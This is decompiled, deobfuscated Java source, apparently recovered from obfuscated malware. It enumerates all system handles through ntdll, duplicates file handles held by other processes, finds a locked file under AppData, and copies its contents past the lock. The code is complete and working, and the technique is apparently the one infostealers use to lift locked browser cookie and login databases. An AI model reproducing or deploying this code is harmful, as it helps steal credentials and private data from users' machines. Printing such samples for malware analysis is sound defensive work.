/* DEOBFUSCATED: LockedFileBypass_Ntdll.java (inner class) */\n\n/*
 * Decompiled with CFR 0.152.
 */
package c;

import c.s$HandleEntry;
import c.s$K32;
import c.s$Ntdll;
import com.sun.jna.Memory;
import com.sun.jna.Native;
import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.WinNT;
import com.sun.jna.ptr.IntByReference;
import com.sun.jna.ptr.LongByReference;
import com.sun.jna.win32.W32APIOptions;
import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.OpenOption;

final class s {
    private static final s$K32 a = Native.load("kernel32", s$K32.class, W32APIOptions.DEFAULT_OPTIONS);
    private static final s$Ntdll b = Native.load("ntdll", s$Ntdll.class, W32APIOptions.DEFAULT_OPTIONS);

    private s() {
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    static void copyLocked(File file, File file2) throws IOException {
        WinNT.HANDLE hANDLE = s.findFileHandle(file.getAbsolutePath());
        if (hANDLE == null) {
            throw new IOException("no process has file open: " + String.valueOf(file));
        }
        try {
            byte[] byArray = s.readFileContent(hANDLE);
            Files.write(file2.toPath(), byArray, new OpenOption[0]);
        }
        finally {
            a.CloseHandle(hANDLE);
        }
    }

    private static WinNT.HANDLE findFileHandle(String string) {
        s$HandleEntry[] s$HandleEntryArray;
        String string2 = s.extractStableSuffix(string);
        WinNT.HANDLE hANDLE = a.GetCurrentProcess();
        try {
            s$HandleEntryArray = s.queryHandles();
        }
        catch (IOException iOException) {
            return null;
        }
        for (s$HandleEntry s$HandleEntry : s$HandleEntryArray) {
            WinNT.HANDLE hANDLE2;
            if (s$HandleEntry.a == 0 || (hANDLE2 = a.OpenProcess(64, false, s$HandleEntry.a)) == null) continue;
            WinNT.HANDLEByReference hANDLEByReference = new WinNT.HANDLEByReference();
            WinNT.HANDLE hANDLE3 = new WinNT.HANDLE(Pointer.createConstant(s$HandleEntry.b));
            boolean bl = a.DuplicateHandle(hANDLE2, hANDLE3, hANDLE, hANDLEByReference, 0, false, 2);
            a.CloseHandle(hANDLE2);
            if (!bl) continue;
            WinNT.HANDLE hANDLE4 = hANDLEByReference.getValue();
            if (a.GetFileType(hANDLE4) != 1) {
                a.CloseHandle(hANDLE4);
                continue;
            }
            String string3 = s.getFinalPath(hANDLE4);
            if (string3 != null && string3.toLowerCase().endsWith(string2)) {
                return hANDLE4;
            }
            a.CloseHandle(hANDLE4);
        }
        return null;
    }

    private static byte[] readFileContent(WinNT.HANDLE hANDLE) throws IOException {
        LongByReference longByReference = new LongByReference();
        if (!a.GetFileSizeEx(hANDLE, longByReference)) {
            throw new IOException("GetFileSizeEx failed");
        }
        long l2 = longByReference.getValue();
        if (l2 <= 0L) {
            throw new IOException("file is empty");
        }
        if (l2 > Integer.MAX_VALUE) {
            throw new IOException("file too large");
        }
        int n2 = (int)l2;
        try {
            return s.mapFile(hANDLE, n2);
        }
        catch (IOException iOException) {
            a.SetFilePointerEx(hANDLE, 0L, null, 0);
            byte[] byArray = new byte[n2];
            IntByReference intByReference = new IntByReference();
            if (!a.ReadFile(hANDLE, byArray, n2, intByReference, null)) {
                throw new IOException("ReadFile failed");
            }
            if (intByReference.getValue() < n2) {
                byte[] byArray2 = new byte[intByReference.getValue()];
                System.arraycopy(byArray, 0, byArray2, 0, intByReference.getValue());
                return byArray2;
            }
            return byArray;
        }
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    private static byte[] mapFile(WinNT.HANDLE hANDLE, int n2) throws IOException {
        WinNT.HANDLE hANDLE2 = a.CreateFileMapping(hANDLE, null, 2, 0, 0, null);
        if (hANDLE2 == null) {
            throw new IOException("CreateFileMapping failed");
        }
        try {
            byte[] byArray;
            Pointer pointer = a.MapViewOfFile(hANDLE2, 4, 0, 0, 0);
            if (pointer == null) {
                throw new IOException("MapViewOfFile failed");
            }
            try {
                byArray = pointer.getByteArray(0L, n2);
                a.UnmapViewOfFile(pointer);
            }
            catch (Throwable throwable) {
                a.UnmapViewOfFile(pointer);
                throw throwable;
            }
            return byArray;
        }
        finally {
            a.CloseHandle(hANDLE2);
        }
    }

    private static String getFinalPath(WinNT.HANDLE hANDLE) {
        char[] cArray;
        int n2;
        int n3 = 512;
        while (true) {
            if ((n2 = a.GetFinalPathNameByHandleW(hANDLE, cArray = new char[n3], n3, 0)) == 0) {
                return null;
            }
            if (n2 <= n3) break;
            n3 = n2;
        }
        String string = new String(cArray, 0, n2);
        if (string.startsWith("\\\\?\\")) {
            string = string.substring(4);
        }
        return string;
    }

    static String extractStableSuffix(String string) {
        String string2 = string.replace('/', '\\').toLowerCase();
        for (String string3 : new String[]{"appdata\\local\\", "appdata\\roaming\\"}) {
            int n2 = string2.indexOf(string3);
            if (n2 < 0) continue;
            return string2.substring(n2 + string3.length());
        }
        String[] stringArray = string2.split("\\\\");
        if (stringArray.length >= 3) {
            return stringArray[stringArray.length - 3] + "\\" + stringArray[stringArray.length - 2] + "\\" + stringArray[stringArray.length - 1];
        }
        return string2;
    }

    private static s$HandleEntry[] queryHandles() throws IOException {
        for (int i2 = 0x400000; i2 <= 0x10000000; i2 *= 2) {
            Memory memory = new Memory(i2);
            IntByReference intByReference = new IntByReference();
            int n2 = b.NtQuerySystemInformation(64, memory, i2, intByReference);
            if (n2 == -1073741820) continue;
            if (n2 != 0) {
                throw new IOException("NtQuerySystemInformation failed: 0x" + Integer.toHexString(n2));
            }
            long l2 = memory.getLong(0L);
            if (l2 == 0L) {
                return new s$HandleEntry[0];
            }
            if (l2 > 5000000L) {
                throw new IOException("suspicious handle count");
            }
            s$HandleEntry[] s$HandleEntryArray = new s$HandleEntry[(int)l2];
            int n3 = 0;
            while ((long)n3 < l2) {
                int n4 = 16 + n3 * 40;
                s$HandleEntryArray[n3] = new s$HandleEntry((int)memory.getLong(n4 + 8), memory.getLong(n4 + 16));
                ++n3;
            }
            return s$HandleEntryArray;
        }
        throw new IOException("handle buffer exceeded max");
    }
}

